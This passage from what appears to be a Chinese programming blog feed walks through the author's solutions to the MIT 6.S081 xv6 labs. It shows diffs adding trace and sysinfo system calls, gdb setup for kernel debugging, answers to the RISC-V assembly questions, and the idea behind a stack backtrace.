</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_trace  22 // here
</span></span>\ No newline at end of file
diff --git a/kernel/sysproc.c b/kernel/sysproc.c
index e8bcda9..3ff51d9 100644
<span class="token coord">--- a/kernel/sysproc.c</span>
<span class="token coord">+++ b/kernel/sysproc.c</span>
@@ -95,3 +95,11 @@ sys_uptime(void)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;tickslock);
</span><span class="token prefix unchanged"> </span><span class="token line">  return xticks;
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">// here
</span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_trace(void) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	if (argint(0, &amp;(myproc()->mask)) &lt; 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">		return -1;
</span><span class="token prefix inserted">+</span><span class="token line">	&#125;
</span><span class="token prefix inserted">+</span><span class="token line">	return 0;
</span><span class="token prefix inserted">+</span><span class="token line">&#125;
</span></span>\ No newline at end of file
diff --git a/user/user.h b/user/user.h
index b71ecda..16107d6 100644
<span class="token coord">--- a/user/user.h</span>
<span class="token coord">+++ b/user/user.h</span>
@@ -23,6 +23,7 @@ int getpid(void);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">char* sbrk(int);
</span><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);
</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int trace(int); // here
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c
</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);
</span></span>diff --git a/user/usys.pl b/user/usys.pl
index 01e426e..76c64ec 100755
<span class="token coord">--- a/user/usys.pl</span>
<span class="token coord">+++ b/user/usys.pl</span>
@@ -36,3 +36,4 @@ entry("getpid");
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");
</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");
</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("trace"); # here
</span></span>\ No newline at end of file</code></pre>

<h1 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>在完整添加了一个新的系统调用，熟悉了整体流程之后，本题相对就比较轻松了。声明添加的操作就跳过不谈了，这里主要关注 <code>sys_sysinfo</code> 的实现：即获取 <code>freemem</code> 和 <code>nproc</code> 的信息并将其填充到参数 <code>sysinfo</code> 指针对应的地址处。</p>
<p>这个大的目标可以拆分为 3 个小目标：</p>
<ol>
<li>如何获取 <code>freemem</code> 的信息？</li>
<li>如何获取 <code>nproc</code> 的信息？</li>
<li>如何将数据填充入指定的地址中（用户空间）？</li>
</ol>
<h3 id="获取-freemem-的信息"><a href="#获取-freemem-的信息" class="headerlink" title="获取 freemem 的信息"></a>获取 <code>freemem</code> 的信息</h3><p>仔细阅读 <code>kernel/kalloc.c</code> 的代码，可以发现一些关键信息：</p>
<ul>
<li><code>struct run</code>：用来内存分配单元的数据结构，本身的地址即为所指向的内存空间的起始地址，包含一个 <code>next</code> 指针，用于实现链表。</li>
<li><code>kmem.freelist</code>：空闲链表，存储着一系列指向空闲空间的指针。</li>
<li><code>PGSIZE</code>：内存分配页的大小，即每个 <code>struct run *</code> 所指向的内存空间的大小。</li>
</ul>
<p>了解了上述信息后，计算空闲空间的大小就很简单了，只需要计算空闲链表的长度 <code>n</code>，空闲内存的空间大小即为 <code>n * PGSIZE</code>。</p>
<pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">freemem_bytes</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	uint64 bytes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">run</span> <span class="token operator">*</span>r<span class="token punctuation">;</span>
	
	<span class="token keyword">for</span> <span class="token punctuation">(</span>r <span class="token operator">=</span> kmem<span class="token punctuation">.</span>freelist<span class="token punctuation">;</span> r<span class="token punctuation">;</span> r <span class="token operator">=</span> r<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		bytes <span class="token operator">+=</span> PGSIZE<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	
	<span class="token keyword">return</span> bytes<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="获取-nproc-的信息"><a href="#获取-nproc-的信息" class="headerlink" title="获取 nproc 的信息"></a>获取 <code>nproc</code> 的信息</h3><p>与上面一样，阅读 <code>kernel/proc.c</code> 的代码，可知：</p>
<ul>
<li><code>struct proc proc[NPROC]</code> ：进程数组，存储着所有进程的 <code>struct proc</code>.</li>
<li><code>UNUSED</code>：<code>struct proc</code> 中 <code>enum procstate</code> 的类型之一，代表本 <code>struct proc</code> 未被使用。</li>
</ul>
<p>那么要得到当前系统中进程的数量，只需要遍历整个 <code>proc</code>，计算未处于 <code>UNUSED</code> 状态的进程数量即可。</p>
<pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">proc_num</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>
	uint64 num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  
	<span class="token keyword">for</span><span class="token punctuation">(</span>p <span class="token operator">=</span> proc<span class="token punctuation">;</span> p <span class="token operator">&lt;</span> <span class="token operator">&amp;</span>proc<span class="token punctuation">[</span>NPROC<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		num <span class="token operator">+=</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>state <span class="token operator">!=</span> UNUSED<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	
	<span class="token keyword">return</span> num<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="将数据填充入指定的地址中"><a href="#将数据填充入指定的地址中" class="headerlink" title="将数据填充入指定的地址中"></a>将数据填充入指定的地址中</h3><p>得到 <code>freemem</code> 和 <code>nproc</code> 之后，就需要将数据写入 <code>sysinfo</code> 的参数 <code>struct sysinfo *</code> 指向的内存区域，获取参数的方法和 <code>tracing</code> 类似，不过由于参数是指针类型，因此采用 <code>argaddr</code>。最后，仿照 <code>kernel/file.c</code> 中的操作，使用 <code>copyout</code> 将内核区域的数据写入用户空间中。</p>
<pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">sys_sysinfo</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">myproc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">sysinfo</span> info<span class="token punctuation">;</span>
	uint64 addr<span class="token punctuation">;</span>
	
	info<span class="token punctuation">.</span>freemem <span class="token operator">=</span> <span class="token function">freemem_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	info<span class="token punctuation">.</span>nproc <span class="token operator">=</span> <span class="token function">proc_num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token comment">// get argument addr</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">argaddr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>addr<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	
	<span class="token comment">// copy data of info to addr</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copyout</span><span class="token punctuation">(</span>p<span class="token operator">-></span>pagetable<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>info<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefile
index 6647da5..cfb5119 100644
<span class="token coord">--- a/Makefile</span>
<span class="token coord">+++ b/Makefile</span>
@@ -194,6 +194,7 @@ UPROGS=\
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">	$U/_wc\
</span><span class="token prefix unchanged"> </span><span class="token line">	$U/_zombie\
</span><span class="token prefix unchanged"> </span><span class="token line">	$U/_trace\
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">	$U/_sysinfotest\
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span>diff --git a/kernel/defs.h b/kernel/defs.h
index 3564db4..b2dbb8d 100644
<span class="token coord">--- a/kernel/defs.h</span>
<span class="token coord">+++ b/kernel/defs.h</span>
@@ -63,6 +63,7 @@ void            ramdiskrw(struct buf*);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void*           kalloc(void);
</span><span class="token prefix unchanged"> </span><span class="token line">void            kfree(void *);
</span><span class="token prefix unchanged"> </span><span class="token line">void            kinit(void);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">uint64          freemem_bytes(void); // here
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// log.c
</span><span class="token prefix unchanged"> </span><span class="token line">void            initlog(int, struct superblock*);
</span></span>@@ -104,6 +105,7 @@ void            yield(void);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             either_copyout(int user_dst, uint64 dst, void *src, uint64 len);
</span><span class="token prefix unchanged"> </span><span class="token line">int             either_copyin(void *dst, int user_src, uint64 src, uint64 len);
</span><span class="token prefix unchanged"> </span><span class="token line">void            procdump(void);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">uint64          proc_num(void); // here
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// swtch.S
</span><span class="token prefix unchanged"> </span><span class="token line">void            swtch(struct context*, struct context*);
</span></span>diff --git a/kernel/kalloc.c b/kernel/kalloc.c
index fa6a0ac..686d84e 100644
<span class="token coord">--- a/kernel/kalloc.c</span>
<span class="token coord">+++ b/kernel/kalloc.c</span>
@@ -80,3 +80,15 @@ kalloc(void)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    memset((char*)r, 5, PGSIZE); // fill with junk
</span><span class="token prefix unchanged"> </span><span class="token line">  return (void*)r;
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">// here
</span><span class="token prefix inserted">+</span><span class="token line">uint64 freemem_bytes(void) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	uint64 bytes = 0;
</span><span class="token prefix inserted">+</span><span class="token line">	struct run *r;
</span><span class="token prefix inserted">+</span><span class="token line">	
</span><span class="token prefix inserted">+</span><span class="token line">	for (r = kmem.freelist; r; r = r->next) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">		bytes += PGSIZE;
</span><span class="token prefix inserted">+</span><span class="token line">	&#125;
</span><span class="token prefix inserted">+</span><span class="token line">	
</span><span class="token prefix inserted">+</span><span class="token line">	return bytes;
</span><span class="token prefix inserted">+</span><span class="token line">&#125;
</span></span>\ No newline at end of file
diff --git a/kernel/proc.c b/kernel/proc.c
index f4bd5c2..ed6eec4 100644
<span class="token coord">--- a/kernel/proc.c</span>
<span class="token coord">+++ b/kernel/proc.c</span>
@@ -657,3 +657,15 @@ procdump(void)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    printf("\n");
</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">// here
</span><span class="token prefix inserted">+</span><span class="token line">uint64 proc_num(void) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	struct proc *p;
</span><span class="token prefix inserted">+</span><span class="token line">	uint64 num = 0;
</span><span class="token prefix inserted">+</span><span class="token line">  
</span><span class="token prefix inserted">+</span><span class="token line">	for(p = proc; p &lt; &amp;proc[NPROC]; ++p) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">		num += (p->state != UNUSED);
</span><span class="token prefix inserted">+</span><span class="token line">	&#125;
</span><span class="token prefix inserted">+</span><span class="token line">	
</span><span class="token prefix inserted">+</span><span class="token line">	return num;
</span><span class="token prefix inserted">+</span><span class="token line">&#125;
</span></span>\ No newline at end of file
diff --git a/kernel/syscall.c b/kernel/syscall.c
index b5b8291..6fed4f2 100644
<span class="token coord">--- a/kernel/syscall.c</span>
<span class="token coord">+++ b/kernel/syscall.c</span>
@@ -105,6 +105,7 @@ extern uint64 sys_wait(void);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);
</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);
</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_trace(void);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_sysinfo(void);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;
</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,
</span></span>@@ -129,6 +130,7 @@ static uint64 (*syscalls[])(void) = &#123;
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,
</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,
</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_trace]   sys_trace,
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_sysinfo] sys_sysinfo,
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// here
</span></span>@@ -137,7 +139,7 @@ static char *syscall_names[] = &#123;
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">	"read",   "kill",  "exec",  "fstat", "chdir",
</span><span class="token prefix unchanged"> </span><span class="token line">	"dup",    "getpid","sbrk",  "sleep", "uptime",
</span><span class="token prefix unchanged"> </span><span class="token line">	"open",   "write", "mknod", "unlink", "link",
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">	"mkdir",  "close", "trace",
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">	"mkdir",  "close", "trace", "sysinfo",
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">void
</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.h
index 756d191..7954d98 100644
<span class="token coord">--- a/kernel/syscall.h</span>
<span class="token coord">+++ b/kernel/syscall.h</span>
<span class="token coord">@@ -20,4 +20,5 @@</span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19
</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20
</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">#define SYS_trace  22 // here
</span></span>\ No newline at end of file
<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_trace  22 // here
</span><span class="token prefix inserted">+</span><span class="token line">#define SYS_sysinfo 23
</span></span>\ No newline at end of file
diff --git a/kernel/sysproc.c b/kernel/sysproc.c
index 3ff51d9..644638f 100644
<span class="token coord">--- a/kernel/sysproc.c</span>
<span class="token coord">+++ b/kernel/sysproc.c</span>
<span class="token coord">@@ -6,6 +6,7 @@</span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#include "memlayout.h"
</span><span class="token prefix unchanged"> </span><span class="token line">#include "spinlock.h"
</span><span class="token prefix unchanged"> </span><span class="token line">#include "proc.h"
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#include "sysinfo.h"
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">uint64
</span><span class="token prefix unchanged"> </span><span class="token line">sys_exit(void)
</span></span>@@ -101,5 +102,26 @@ uint64 sys_trace(void) &#123;
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">	if (argint(0, &amp;(myproc()->mask)) &lt; 0) &#123;
</span><span class="token prefix unchanged"> </span><span class="token line">		return -1;
</span><span class="token prefix unchanged"> </span><span class="token line">	&#125;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">	return 0;
</span><span class="token prefix inserted">+</span><span class="token line">&#125;
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_sysinfo(void) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	struct proc *p = myproc();
</span><span class="token prefix inserted">+</span><span class="token line">	struct sysinfo info;
</span><span class="token prefix inserted">+</span><span class="token line">	uint64 addr;
</span><span class="token prefix inserted">+</span><span class="token line">	
</span><span class="token prefix inserted">+</span><span class="token line">	info.freemem = freemem_bytes();
</span><span class="token prefix inserted">+</span><span class="token line">	info.nproc = proc_num();
</span><span class="token prefix inserted">+</span><span class="token line">	
</span><span class="token prefix inserted">+</span><span class="token line">	// get argument addr
</span><span class="token prefix inserted">+</span><span class="token line">	if (argaddr(0, &amp;addr) &lt; 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">		return -1;
</span><span class="token prefix inserted">+</span><span class="token line">	&#125;
</span><span class="token prefix inserted">+</span><span class="token line">	
</span><span class="token prefix inserted">+</span><span class="token line">	// copy data of info to addr
</span><span class="token prefix inserted">+</span><span class="token line">	if (copyout(p->pagetable, addr, (char *)&amp;info, sizeof(info)) &lt; 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">		return -1;
</span><span class="token prefix inserted">+</span><span class="token line">	&#125;
</span><span class="token prefix inserted">+</span><span class="token line">	
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">	return 0;
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span></span>\ No newline at end of file
diff --git a/user/user.h b/user/user.h
index 16107d6..37d15a5 100644
<span class="token coord">--- a/user/user.h</span>
<span class="token coord">+++ b/user/user.h</span>
<span class="token coord">@@ -1,5 +1,6 @@</span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">struct stat;
</span><span class="token prefix unchanged"> </span><span class="token line">struct rtcdate;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">struct sysinfo; // here
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// system calls
</span><span class="token prefix unchanged"> </span><span class="token line">int fork(void);
</span></span>@@ -24,6 +25,7 @@ char* sbrk(int);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);
</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);
</span><span class="token prefix unchanged"> </span><span class="token line">int trace(int); // here
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int sysinfo(struct sysinfo *);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c
</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);
</span></span>diff --git a/user/usys.pl b/user/usys.pl
index 76c64ec..fde7c87 100755
<span class="token coord">--- a/user/usys.pl</span>
<span class="token coord">+++ b/user/usys.pl</span>
@@ -36,4 +36,5 @@ entry("getpid");
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");
</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");
</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">entry("trace"); # here
</span></span>\ No newline at end of file
<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("trace"); # here
</span><span class="token prefix inserted">+</span><span class="token line">entry("sysinfo")
</span></span>\ No newline at end of file</code></pre>

]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>经验</tag>
        <tag>操作系统</tag>
        <tag>xv6</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT6.s081 2021 Lab Traps</title>
    <url>/2024/07/06/MIT6.s081-2021-Lab%20Traps/</url>
    <content><![CDATA[<h1 id="使用gdb调试xv6内核"><a href="#使用gdb调试xv6内核" class="headerlink" title="使用gdb调试xv6内核"></a>使用gdb调试xv6内核</h1><p>从最近两个 Lab 开始，代码逻辑的复杂度明显上升，对内核进行调试可能是帮助理解操作系统机制的绝佳方法。因此在开始本 Lab 之前，我们先来配置一下针对 xv6 内核的 gdb 调试器。</p>
<ol>
<li>安装 <code>gdb-multiarch</code>.</li>
</ol>
<p>利用包管理工具进行安装，我使用的是 Ubuntu 系统，执行以下命令：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">sudo apt install gdb-multiarch</code></pre>

<ol start="2">
<li>在 xv6 项目根目录下可以看到 <code>.gdbinit</code> 文件，其中已经写好了一些 <code>gdb</code> 的初始化选项，使用文本编辑器或 <code>cat</code> 命令查看：</li>
</ol>
<pre class="language-ini" data-language="ini"><code class="language-ini">set confirm off                                                         
set architecture riscv:rv64                                             
target remote 127.0.0.1:26000                                           
symbol-file kernel/kernel                                               
set disassemble-next-line auto           
set riscv use-compressed-breakpoints yes</code></pre>

<ol start="3">
<li>在 <code>~/.config/gdb/</code> 目录下的文件 <code>gdbinit</code> 中（没有则新建）添加安全加载路径，否则可能无法加载 <code>.gdbinit</code> 的配置。</li>
</ol>
<pre class="language-ini" data-language="ini"><code class="language-ini">add-auto-load-safe-path &lt;xv6项目的根目录>/.gdbinit</code></pre>

<ol start="4">
<li>打开两个终端窗口（可以使用 tmux 进行分屏），都需要进入 xv6 根目录，第一个窗口输入 <code>make-qemu</code> 等待调试器连接，第二个窗口输入 <code>gdb-multiarch</code> 打开 <code>gdb</code>，如果前面配置正确，那么 <code>gdb</code> 并自动加载 <code>.gdbinit</code> 配置，与 <code>qemu</code> 连接，之后便可以开始正常调试了。</li>
</ol>
<p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/gdb.png"></p>
<h1 id="RISC-V-assembly"><a href="#RISC-V-assembly" class="headerlink" title="RISC-V assembly"></a>RISC-V assembly</h1><p>一些有关 RISC-V 汇编的问题，最好先通过网上博客或手册简单了解一下 RISC-V 的基本指令。</p>
<p><strong>Q1:</strong> </p>
<blockquote>
<p>Which registers contain arguments to functions? For example, which register holds 13 in main’s call to <code>printf</code>?</p>
</blockquote>
<p><strong>A1:</strong> </p>
<p>可以参考 RISC-V 的 <em>calling convention</em>，<code>a0</code> - <code>a7</code>: 这些寄存器用于传递函数的前八个整数或指针类型的参数，如果超出这些寄存器的数量，超出的部分会存放在栈上。观察指令 <code>li  a2,13</code> 可知，13 作为 <code>printf</code> 的第二个参数，存放在寄存器 <code>a2</code> 中。</p>
<p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/reg.png"></p>
<p><strong>Q2:</strong></p>
<blockquote>
<p>Where is the call to function <code>f</code> in the assembly code for main? Where is the call to <code>g</code>? (Hint: the compiler may inline functions.)</p>
</blockquote>
<p><strong>A2:</strong> </p>
<p>调用函数 <code>f</code> 和函数 <code>g</code> 的代码被编译器优化，直接计算出了结果 12，作为 <code>printf</code> 的参数存入寄存器 <code>a1</code> 中：</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">26:   45b1                    li  a1,12</code></pre>

<p><strong>Q3:</strong></p>
<blockquote>
<p>At what address is the function <code>printf</code> located?</p>
</blockquote>
<p><strong>A3:</strong> </p>
<p>位于 0x638 地址处。</p>
<p><strong>Q4:</strong></p>
<blockquote>
<p>What value is in the register <code>ra</code> just after the <code>jalr</code> to <code>printf</code> in <code>main</code>?</p>
</blockquote>
<p><strong>A4:</strong> 参考 <a href="https://pdos.csail.mit.edu/6.828/2021/readings/riscv-calling.pdf">riscv-calling</a>，<code>ra</code> 用来存储函数调用的返回地址，因此 <code>ra</code> 的值为 <code>jalr    1544(ra)</code> 的后一条指令地址，即 0x38.</p>
<p><strong>Q5:</strong></p>
<blockquote>
<p>Run the following code.</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0x00646c72</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"H%x Wo%s"</span><span class="token punctuation">,</span> <span class="token number">57616</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>What is the output? <a href="http://web.cs.mun.ca/~michael/c/ascii-table.html">Here’s an ASCII table</a> that maps bytes to characters.</p>
<p>The output depends on that fact that the RISC-V is little-endian. If the RISC-V were instead big-endian what would you set <code>i</code> to in order to yield the same output? Would you need to change <code>57616</code> to a different value?</p>
<p><a href="http://www.webopedia.com/TERM/b/big_endian.html">Here’s a description of little- and big-endian</a> and <a href="http://www.networksorcery.com/enp/ien/ien137.txt">a more whimsical description</a>.</p>
</blockquote>
<p><strong>A5:</strong></p>
<ul>
<li><code>%x</code> 用于输出一个无符号十六进制整数。</li>
<li><code>%s</code> 用于输出一个字符指针所指向的字符串，直到遇到空字符<code>\0</code>为止。</li>
</ul>
<p>小端模式下，57616 的 十六进制表示为 e110，<code>&amp;i</code> 首地址开始的字节分别为 <code>0x72, 0x6c, 0x64, 0x0</code>，对应 ASCII 表中的字符为 <code>r, l, d</code>，因此最终输出结果为 <code>He110 World</code>.</p>
<p>若采取大端模式，<code>i</code> 的值应当替换为 <code>0x726c6400</code>，57616 的值无需改变，因为十六进制的书写规则并没有改变（高位在左，低位在右）。</p>
<p><strong>Q6:</strong></p>
<blockquote>
<p>In the following code, what is going to be printed after <code>&#39;y=&#39;</code>? (note: the answer is not a specific value.) Why does this happen?</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"x=%d y=%d"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
</blockquote>
<p><strong>A6:</strong></p>
<p>关于可变参数的内容查看 《<em>C Programming Language 2nd Edition</em>》（K&amp;R）的 7.3 节 <em>Variable-length Argument Lists</em>.</p>
<p>简而言之，这样的操作将引发<strong>未定义行为</strong>，此时 <code>ap</code> 指向了一个未知的内存区域，并将该区域的数据以整型的形式输出。</p>
<h1 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>思路其实很简单：对照 <a href="https://pdos.csail.mit.edu/6.828/2021/lec/l-riscv-slides.pdf">lecture notes</a> 给出的栈的结构，从当前栈帧的起始地址 <code>fp</code> 开始，<code>fp - 8</code> 的位置存放着当前函数调用的返回地址（上一次函数调用处的下一条指令地址），即我们 <strong>需要打印</strong> 的地址，<code>fp - 16</code> 的位置存放着上一次函数调用所在栈帧的起始地址，将该地址作为新的 <code>fp</code> 重复上述步骤即可。</p>
<p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/st.png"></p>
